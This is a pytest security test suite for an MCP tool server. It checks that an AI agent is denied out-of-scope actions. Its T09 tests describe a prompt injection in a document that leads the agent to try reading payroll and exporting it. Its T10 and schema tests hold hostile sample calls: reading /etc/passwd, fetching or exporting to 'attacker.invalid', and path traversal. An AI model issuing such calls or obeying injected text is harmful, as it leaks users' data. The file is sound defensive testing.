"""T07-T10 and MCP tool-boundary attacks. The MCP server runs the official SDK over streamable HTTP;
the agent authenticates with its OWN Keycloak client-credentials token (aud=aegis-mcp)."""

from __future__ import annotations

import asyncio
import uuid
from collections.abc import Iterator
from typing import Any

import httpx
import pytest

from aegis.agent_client import McpToolClient
from aegis.planner import ToolResult
from tests.conftest import CANARIES, Evidence, Keycloak, ServerHandle, free_port, make_settings, start_server

pytestmark = pytest.mark.security


# ----------------------------------------------------------------------------- helpers


def mcp_calls(
    url: str, token: str, task_id: str | None, calls: list[tuple[str, dict[str, Any]]]
) -> list[ToolResult]:
    async def go() -> list[ToolResult]:
        async with McpToolClient(url=f"{url}/mcp", access_token=token, task_id=task_id) as c:
            return [await c.call(name, args) for name, args in calls]

    return asyncio.run(go())


def mcp_call(url: str, token: str, task_id: str | None, name: str, args: dict[str, Any]) -> ToolResult:
    return mcp_calls(url, token, task_id, [(name, args)])[0]


def create_task(
    api: httpx.Client, kc: Keycloak, user: str, resource_ids: list[str], actions: list[str] | None = None
) -> str:
    r = api.post(
        "/api/v1/tasks",
        json={
            "agent_id": "agent-alpha",
            "actions": actions or ["documents:read", "reports:create"],
            "resource_ids": resource_ids,
        },
        headers={"Authorization": f"Bearer {kc.password_token(user)}"},
    )
    assert r.status_code == 201, r.text
    task_id: str = r.json()["task_id"]
    return task_id


def denied(res: ToolResult) -> bool:
    return not res.ok and res.error is not None and "ACCESS_DENIED" in res.error


# ----------------------------------------------------------------------------- T07


def test_t07_missing_or_invalid_delegation(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    agent = kc.client_token("agent-alpha")
    real_task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    cases = {
        "no_task_header": None,
        "malformed_task": "not-a-uuid",
        "unknown_task": str(uuid.uuid4()),
    }
    mark = db.mark()
    since = db.now()
    results = {
        k: mcp_call(mcp_server.url, agent, v, "documents.read", {"resource_id": "doc-alpha-eng"})
        for k, v in cases.items()
    }
    # Another agent (beta tenant) presenting alice's real task id.
    results["other_agents_task"] = mcp_call(
        mcp_server.url,
        kc.client_token("agent-beta"),
        real_task,
        "documents.read",
        {"resource_id": "doc-alpha-eng"},
    )
    effects = db.side_effects(mark)
    deny_rows = [e for e in db.audit_since(since) if e["decision"] == "deny"]
    reasons = {e["reason_code"] for e in deny_rows}
    record(
        scenario_id="T07",
        description="Agent tool call without a valid delegation (none/malformed/unknown/other agent's task)",
        request="documents.read(doc-alpha-eng) x4",
        expected_decision="deny",
        actual_decision="deny" if all(denied(r) for r in results.values()) else "allow",
        expected_side_effects=0,
        actual_side_effects=effects,
        audit_events=len(deny_rows),
        attack=True,
    )
    for name, res in results.items():
        assert denied(res), name
    assert effects == 0
    assert {"DELEGATION_MISSING", "DELEGATION_NOT_FOUND"} <= reasons


def test_t07_revoked_and_expired_delegations(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    agent = kc.client_token("agent-alpha")
    revoked = create_task(api, kc, "alice", ["doc-alpha-eng"])
    expired = create_task(api, kc, "alice", ["doc-alpha-eng"])
    # sanity: works before revocation
    assert mcp_call(mcp_server.url, agent, revoked, "documents.read", {"resource_id": "doc-alpha-eng"}).ok
    r = api.post(
        f"/api/v1/tasks/{revoked}/revoke", headers={"Authorization": f"Bearer {kc.password_token('alice')}"}
    )
    assert r.status_code == 200
    db.execute(
        "UPDATE delegations SET created_at = now() - interval '2 hours', expires_at = now() - interval "
        "'1 hour' WHERE task_id = %s",
        (expired,),
    )
    mark = db.mark()
    since = db.now()
    assert denied(
        mcp_call(mcp_server.url, agent, revoked, "documents.read", {"resource_id": "doc-alpha-eng"})
    )
    assert denied(
        mcp_call(mcp_server.url, agent, expired, "documents.read", {"resource_id": "doc-alpha-eng"})
    )
    assert db.side_effects(mark) == 0
    reasons = " ".join(e["reason_code"] for e in db.audit_since(since))
    assert "DELEGATION_REVOKED" in reasons and "DELEGATION_EXPIRED" in reasons


def test_bob_cannot_revoke_alices_task(api: httpx.Client, kc: Keycloak) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    r = api.post(
        f"/api/v1/tasks/{task}/revoke", headers={"Authorization": f"Bearer {kc.password_token('bob')}"}
    )
    assert r.status_code == 403
    r = api.post(
        f"/api/v1/tasks/{task}/invoke", headers={"Authorization": f"Bearer {kc.password_token('bob')}"}
    )
    assert r.status_code == 403


# ----------------------------------------------------------------------------- T08


def test_t08_agent_reads_in_scope_document(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    mark = db.mark()
    since = db.now()
    res = mcp_call(
        mcp_server.url,
        kc.client_token("agent-alpha"),
        task,
        "documents.read",
        {"resource_id": "doc-alpha-eng"},
    )
    audit = db.audit_since(since)
    reads = db.side_effects(mark, kind="document_read", resource_id="doc-alpha-eng")
    total = db.side_effects(mark)
    record(
        scenario_id="T08",
        description="Agent reads a document inside its delegated task",
        request="documents.read(doc-alpha-eng) with alice's task",
        expected_decision="allow",
        actual_decision="allow" if res.ok else "deny",
        expected_side_effects=1,
        actual_side_effects=reads,
        audit_events=len(audit),
        attack=False,
    )
    assert res.ok and res.data is not None
    assert res.data["document_id"] == "doc-alpha-eng"
    assert set(res.data) == {"document_id", "title", "body", "classification"}
    assert reads == 1 and total == 1
    assert [(e["event_kind"], e["decision"]) for e in audit] == [("decision", "allow"), ("execution", "n/a")]
    assert audit[0]["agent_id"] == "agent-alpha" and audit[0]["principal_id"] == "alice"


# ----------------------------------------------------------------------------- T09


def test_t09_prompt_injection_via_full_agent_run(
    api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    """Alice delegates a summary of two engineering docs; one contains an injected instruction to read
    payroll and export it. The naive planner OBEYS; the tool boundary must still block it."""
    task = create_task(api, kc, "alice", ["doc-alpha-eng", "doc-alpha-eng-notes"])
    mark = db.mark()
    r = api.post(
        f"/api/v1/tasks/{task}/invoke", headers={"Authorization": f"Bearer {kc.password_token('alice')}"}
    )
    assert r.status_code == 200, r.text
    body = r.json()
    injected = [t for t in body["trace"] if t["origin"] == "injected"]
    payroll_reads = db.side_effects(mark, resource_id="doc-alpha-payroll")
    exports = db.side_effects(mark, kind="export_simulated")
    audit = db.audit_for_correlation(body["correlation_id"])
    attempted = [
        e for e in audit if e["resource_id"] == "doc-alpha-payroll" and e["event_kind"] == "decision"
    ]
    record(
        scenario_id="T09",
        description="Prompt injection in a document instructs the agent to read payroll and export it",
        request="POST /api/v1/tasks/{id}/invoke (planner obeys injected text)",
        expected_decision="deny",
        actual_decision="deny" if all(not t["ok"] for t in injected) else "allow",
        expected_side_effects=0,
        actual_side_effects=payroll_reads + exports,
        audit_events=len(attempted),
        attack=True,
    )
    # The planner really attempted the prohibited calls...
    assert {t["tool"] for t in injected} == {"documents.read", "exports.simulate"}
    assert all(t["arguments"]["resource_id"] == "doc-alpha-payroll" for t in injected)
    # ...and every one was denied at the tool boundary.
    assert all(not t["ok"] and "ACCESS_DENIED" in t["error"] for t in injected)
    assert payroll_reads == 0 and exports == 0
    # Legitimate work still happened: two reads + one report.
    assert db.side_effects(mark, kind="document_read") == 2
    assert db.side_effects(mark, kind="report_write") == 1
    assert body["report_id"]
    # The attempts are in the audit trail, linked by correlation id, with the reason.
    assert {e["tool_name"] for e in attempted} == {"documents.read", "exports.simulate"}
    assert all(e["decision"] == "deny" for e in attempted)
    assert any("TASK_SCOPE_EXCEEDED" in e["reason_code"] for e in attempted)
    # No protected content leaks through the agent response.
    assert "AEGIS-CANARY-PAYROLL-7731" not in r.text


def test_t09_injection_when_user_could_read_target(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    """Bob (finance) CAN read payroll himself; his agent, working on a finance-notes task, still cannot."""
    task = create_task(api, kc, "bob", ["doc-alpha-finance-notes"])
    from aegis.planner import DeterministicPlanner

    async def run() -> Any:
        async with McpToolClient(
            url=f"{mcp_server.url}/mcp", access_token=kc.client_token("agent-alpha"), task_id=task
        ) as c:
            return await DeterministicPlanner().run(
                task_id=task, resource_ids=["doc-alpha-finance-notes"], client=c
            )

    mark = db.mark()
    since = db.now()
    run_result = asyncio.run(run())
    injected_denials = [
        e
        for e in db.audit_since(since)
        if e["decision"] == "deny"
        and e["tool_name"] in ("documents.read", "exports.simulate", "admin.grant_role")
    ]
    injected = [t for t in run_result.trace if t.origin == "injected"]
    payroll = db.side_effects(mark, resource_id="doc-alpha-payroll")
    exports = db.side_effects(mark, kind="export_simulated")
    record(
        scenario_id="T09b",
        description="Injection targets payroll that the DELEGATING USER may read; agent ∩ task still deny",
        request="planner on bob's finance-notes task",
        expected_decision="deny",
        actual_decision="deny" if all(not t.ok for t in injected) else "allow",
        expected_side_effects=0,
        actual_side_effects=payroll + exports,
        audit_events=len(injected_denials),
        attack=True,
    )
    tools = [t.tool for t in injected]
    assert "documents.read" in tools and "exports.simulate" in tools and "admin.grant_role" in tools
    assert all(not t.ok for t in injected)
    assert payroll == 0 and exports == 0
    assert len(injected_denials) == len(injected)  # every injected attempt is in the audit trail


# ----------------------------------------------------------------------------- T10


def test_t10_unknown_and_forbidden_tools(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    task = create_task(api, kc, "bob", ["doc-alpha-finance-notes"])
    # Even a (tampered) delegation that lists exports:simulate does not make export possible.
    db.execute(
        "UPDATE delegations SET allowed_actions = allowed_actions || '{exports:simulate}' WHERE task_id = %s",
        (task,),
    )
    calls: list[tuple[str, dict[str, Any]]] = [
        ("admin.grant_role", {"principal": "alice", "role": "finance-analyst"}),
        ("execute_command", {"cmd": "cat /etc/passwd"}),
        ("run_sql", {"sql": "SELECT body FROM resources"}),
        ("http_fetch", {"url": "https://attacker.invalid"}),
        ("send_email", {"to": "attacker@example.invalid"}),
        ("documents.delete", {"resource_id": "doc-alpha-eng"}),
        (
            "exports.simulate",
            {"resource_id": "doc-alpha-finance-notes", "destination": "https://attacker.invalid"},
        ),
    ]
    mark = db.mark()
    since = db.now()
    results = mcp_calls(mcp_server.url, kc.client_token("agent-alpha"), task, calls)
    effects = db.side_effects(mark)
    audit = [e for e in db.audit_since(since) if e["decision"] == "deny"]
    record(
        scenario_id="T10",
        description="Unknown tools (admin/shell/sql/http/email/delete) and test-only exports.simulate",
        request=", ".join(c[0] for c in calls),
        expected_decision="deny",
        actual_decision="deny" if all(not r.ok for r in results) else "allow",
        expected_side_effects=0,
        actual_side_effects=effects,
        audit_events=len(audit),
        attack=True,
    )
    for (name, _), res in zip(calls, results, strict=True):
        assert not res.ok, name
    assert effects == 0
    assert sum(1 for e in audit if e["reason_code"] == "UNKNOWN_TOOL") == 6
    export_events = [e for e in audit if e["tool_name"] == "exports.simulate"]
    assert export_events and "SUBJECT_NOT_GRANTED" in export_events[0]["reason_code"]


# ----------------------------------------------------------------------------- impersonation & schemas


def test_tool_arguments_cannot_carry_identity(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    agent = kc.client_token("agent-alpha")
    spoofs = [
        {"user_id": "bob"},
        {"tenant_id": "beta"},
        {"role": "finance-analyst"},
        {"agent_id": "agent-beta"},
        {"task_id": str(uuid.uuid4())},
        {"approved": True},
    ]
    mark = db.mark()
    since = db.now()
    results = mcp_calls(
        mcp_server.url,
        agent,
        task,
        [("documents.read", {"resource_id": "doc-alpha-payroll", **s}) for s in spoofs],
    )
    rejected = [e for e in db.audit_since(since) if e["reason_code"] == "INVALID_ARGUMENTS"]
    effects = db.side_effects(mark)
    record(
        scenario_id="T12-mcp",
        description="Identity/role/approval fields injected into MCP tool arguments",
        request="documents.read(doc-alpha-payroll, user_id=bob | tenant_id=beta | role=... | approved=true)",
        expected_decision="deny",
        actual_decision="deny" if all(not r.ok for r in results) else "allow",
        expected_side_effects=0,
        actual_side_effects=effects,
        audit_events=len(rejected),
        attack=True,
    )
    assert all(not r.ok and r.error and "INVALID_ARGUMENTS" in r.error for r in results)
    assert len(rejected) == len(spoofs)
    assert effects == 0


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("documents.read", {"resource_id": "x" * 500}),
        ("documents.read", {"resource_id": 42}),
        ("documents.read", {"resource_id": "../../etc/passwd"}),
        ("documents.read", {}),
        ("documents.search", {"query": "a" * 101}),
        ("documents.search", {"query": "Alpha", "max_results": 1000}),
        ("documents.search", {"query": "Alpha", "max_results": "5"}),
        (
            "reports.create_summary",
            {"task_id": "t", "document_ids": ["doc-alpha-eng"], "summary_text": "x" * 3000},
        ),
        ("reports.create_summary", {"task_id": "t", "document_ids": [], "summary_text": "x"}),
        ("documents.read", {"resource_id": "doc-alpha-eng", "pad": "A" * 20000}),
    ],
)
def test_schema_invalid_arguments_never_execute(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, tool: str, args: dict[str, Any]
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"], actions=["documents:read", "documents:search"])
    mark = db.mark()
    res = mcp_call(mcp_server.url, kc.client_token("agent-alpha"), task, tool, args)
    assert not res.ok
    assert res.error is not None and ("INVALID_ARGUMENTS" in res.error or "PAYLOAD_TOO_LARGE" in res.error)
    assert "xxxxxxxx" not in res.error and "passwd" not in res.error  # values never echoed
    assert db.side_effects(mark) == 0


def test_search_filters_before_returning(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    task = create_task(
        api, kc, "alice", ["doc-alpha-eng", "doc-alpha-eng-notes"], actions=["documents:search"]
    )
    agent = kc.client_token("agent-alpha")
    res = mcp_call(mcp_server.url, agent, task, "documents.search", {"query": "Alpha", "max_results": 10})
    assert res.ok and res.data is not None
    ids = [i["document_id"] for i in res.data["items"]]
    assert sorted(ids) == ["doc-alpha-eng", "doc-alpha-eng-notes"]  # payroll + finance notes filtered out
    assert all(set(i) == {"document_id", "title"} for i in res.data["items"])
    beta = mcp_call(mcp_server.url, agent, task, "documents.search", {"query": "Beta"})
    assert beta.ok and beta.data == {"items": []}
    payroll = mcp_call(mcp_server.url, agent, task, "documents.search", {"query": "Payroll"})
    assert payroll.ok and payroll.data == {"items": []}


def test_report_requires_all_sources_in_scope(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    other_task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    agent = kc.client_token("agent-alpha")
    mark = db.mark()
    bad = mcp_call(
        mcp_server.url,
        agent,
        task,
        "reports.create_summary",
        {"task_id": task, "document_ids": ["doc-alpha-eng", "doc-alpha-payroll"], "summary_text": "s"},
    )
    mismatch = mcp_call(
        mcp_server.url,
        agent,
        task,
        "reports.create_summary",
        {"task_id": other_task, "document_ids": ["doc-alpha-eng"], "summary_text": "s"},
    )
    assert not bad.ok and not mismatch.ok
    assert db.side_effects(mark) == 0
    good = mcp_call(
        mcp_server.url,
        agent,
        task,
        "reports.create_summary",
        {"task_id": task, "document_ids": ["doc-alpha-eng"], "summary_text": "synthetic"},
    )
    assert good.ok
    assert db.side_effects(mark, kind="report_write") == 1


def test_role_revocation_takes_effect_on_running_delegation(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    """User grants are re-evaluated on every tool call: removing alice's role stops her agent at once."""
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    agent = kc.client_token("agent-alpha")
    assert mcp_call(mcp_server.url, agent, task, "documents.read", {"resource_id": "doc-alpha-eng"}).ok
    db.execute("DELETE FROM principal_roles WHERE principal_id = 'alice' AND role_id = 'engineer'")
    try:
        mark = db.mark()
        res = mcp_call(mcp_server.url, agent, task, "documents.read", {"resource_id": "doc-alpha-eng"})
        assert denied(res)
        assert db.side_effects(mark) == 0
    finally:
        db.execute("INSERT INTO principal_roles VALUES ('alice', 'alpha', 'engineer') ON CONFLICT DO NOTHING")


def test_deactivated_agent_identity_denied(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    agent = kc.client_token("agent-alpha")
    db.execute("UPDATE agent_identities SET active = false WHERE principal_id = 'agent-alpha'")
    try:
        mark = db.mark()
        assert denied(
            mcp_call(mcp_server.url, agent, task, "documents.read", {"resource_id": "doc-alpha-eng"})
        )
        assert db.side_effects(mark) == 0
    finally:
        db.execute("UPDATE agent_identities SET active = true WHERE principal_id = 'agent-alpha'")


# ----------------------------------------------------------------------------- transport-level authn


def _raw_mcp(url: str, token: str | None) -> httpx.Response:
    headers = {
        "Accept": "application/json, text/event-stream",
        "Content-Type": "application/json",
        "MCP-Protocol-Version": "2025-11-25",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {"name": "documents.read", "arguments": {"resource_id": "doc-alpha-eng"}},
    }
    return httpx.post(f"{url}/mcp", json=body, headers=headers, timeout=10)


def test_mcp_rejects_wrong_audience_and_missing_tokens(
    mcp_server: ServerHandle, kc: Keycloak, db: Evidence, record: Any
) -> None:
    mark = db.mark()
    cases = {
        "none": None,
        "user_api_token": kc.password_token("alice"),  # aud=aegis-api: no passthrough into MCP
        "workload_api_token": kc.client_token("svc-reporter"),
        "garbage": "not.a.token",
    }
    since = db.now()
    statuses = {k: _raw_mcp(mcp_server.url, v).status_code for k, v in cases.items()}
    effects = db.side_effects(mark)
    decisions = [e for e in db.audit_since(since) if e["event_kind"] in ("decision", "execution")]
    record(
        scenario_id="T05-mcp",
        description="MCP server given no token / API-audience tokens / garbage",
        request="POST /mcp tools/call documents.read",
        expected_decision="401",
        actual_decision=",".join(sorted({str(s) for s in statuses.values()})),
        expected_side_effects=0,
        actual_side_effects=effects,
        audit_events=len(decisions),
        attack=True,
    )
    assert set(statuses.values()) == {401}, statuses
    assert decisions == []
    assert effects == 0
    r = _raw_mcp(mcp_server.url, None)
    assert "resource_metadata" in r.headers.get("www-authenticate", "")


def test_connection_reuse_does_not_leak_identity(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    """Same HTTP client / keep-alive connection; the second request carries agent-beta's token and must
    be evaluated as agent-beta (stateless mode: identity comes from each request's bearer token)."""
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])

    async def go() -> tuple[ToolResult, ToolResult]:
        async with McpToolClient(
            url=f"{mcp_server.url}/mcp", access_token=kc.client_token("agent-alpha"), task_id=task
        ) as c:
            first = await c.call("documents.read", {"resource_id": "doc-alpha-eng"})
            c._http.headers["Authorization"] = f"Bearer {kc.client_token('agent-beta')}"
            second = await c.call("documents.read", {"resource_id": "doc-alpha-eng"})
            return first, second

    mark = db.mark()
    first, second = asyncio.run(go())
    assert first.ok and denied(second)
    assert db.side_effects(mark) == 1


def test_tools_list_is_exact_allowlist(mcp_server: ServerHandle, kc: Keycloak) -> None:
    async def go() -> list[Any]:
        async with McpToolClient(
            url=f"{mcp_server.url}/mcp", access_token=kc.client_token("agent-alpha"), task_id=None
        ) as c:
            return await c.list_tools()

    tools = {t.name: t for t in asyncio.run(go())}
    assert set(tools) == {"documents.read", "documents.search", "reports.create_summary", "exports.simulate"}
    read = tools["documents.read"].input_schema
    assert read["required"] == ["resource_id"]
    assert read["properties"]["resource_id"]["maxLength"] == 64
    assert "pattern" in read["properties"]["resource_id"]
    assert tools["documents.search"].input_schema["properties"]["max_results"]["maximum"] == 10
    assert tools["documents.read"].output_schema is not None
    assert set(tools["documents.read"].output_schema["properties"]) == {
        "document_id",
        "title",
        "body",
        "classification",
    }


@pytest.fixture(scope="module")
def production_like_mcp() -> Iterator[ServerHandle]:
    from aegis_mcp.server import create_app

    handle = start_server(create_app(make_settings(enable_test_tools=False, mcp_rate_limit_per_minute=3)))
    yield handle
    handle.stop()


def test_without_test_tools_only_three_tools_and_rate_limit(
    production_like_mcp: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence
) -> None:
    agent = kc.client_token("agent-alpha")

    async def go() -> list[Any]:
        async with McpToolClient(url=f"{production_like_mcp.url}/mcp", access_token=agent, task_id=None) as c:
            return await c.list_tools()

    assert {t.name for t in asyncio.run(go())} == {
        "documents.read",
        "documents.search",
        "reports.create_summary",
    }
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    mark = db.mark()
    results = mcp_calls(
        production_like_mcp.url, agent, task, [("documents.read", {"resource_id": "doc-alpha-eng"})] * 5
    )
    assert [r.ok for r in results] == [True, True, True, False, False]
    assert db.side_effects(mark) == 3


@pytest.fixture(scope="module")
def mcp_without_opa() -> Iterator[ServerHandle]:
    from aegis_mcp.server import create_app

    handle = start_server(create_app(make_settings(opa_url=f"http://127.0.0.1:{free_port()}")))
    yield handle
    handle.stop()


def test_t11_mcp_policy_engine_down(
    mcp_without_opa: ServerHandle, api: httpx.Client, kc: Keycloak, db: Evidence, record: Any
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    mark = db.mark()
    since = db.now()
    res = mcp_call(
        mcp_without_opa.url,
        kc.client_token("agent-alpha"),
        task,
        "documents.read",
        {"resource_id": "doc-alpha-eng"},
    )
    effects = db.side_effects(mark)
    incidents = [e for e in db.audit_since(since) if e["event_kind"] == "incident"]
    record(
        scenario_id="T11-mcp",
        description="OPA unreachable at the MCP tool boundary",
        request="documents.read(doc-alpha-eng) in a valid task",
        expected_decision="deny",
        actual_decision="allow" if res.ok else "deny",
        expected_side_effects=0,
        actual_side_effects=effects,
        audit_events=len(incidents),
        attack=False,
    )
    assert not res.ok and res.error is not None and "DEPENDENCY_UNAVAILABLE" in res.error
    assert len(incidents) == 1 and incidents[0]["reason_code"] == "POLICY_UNAVAILABLE"
    assert effects == 0


def test_denied_tool_errors_do_not_leak_content(
    mcp_server: ServerHandle, api: httpx.Client, kc: Keycloak
) -> None:
    task = create_task(api, kc, "alice", ["doc-alpha-eng"])
    res = mcp_call(
        mcp_server.url,
        kc.client_token("agent-alpha"),
        task,
        "documents.read",
        {"resource_id": "doc-alpha-payroll"},
    )
    assert denied(res)
    assert not any(c in (res.error or "") for c in CANARIES)
    assert "restricted" not in (res.error or "") and "finance" not in (res.error or "")
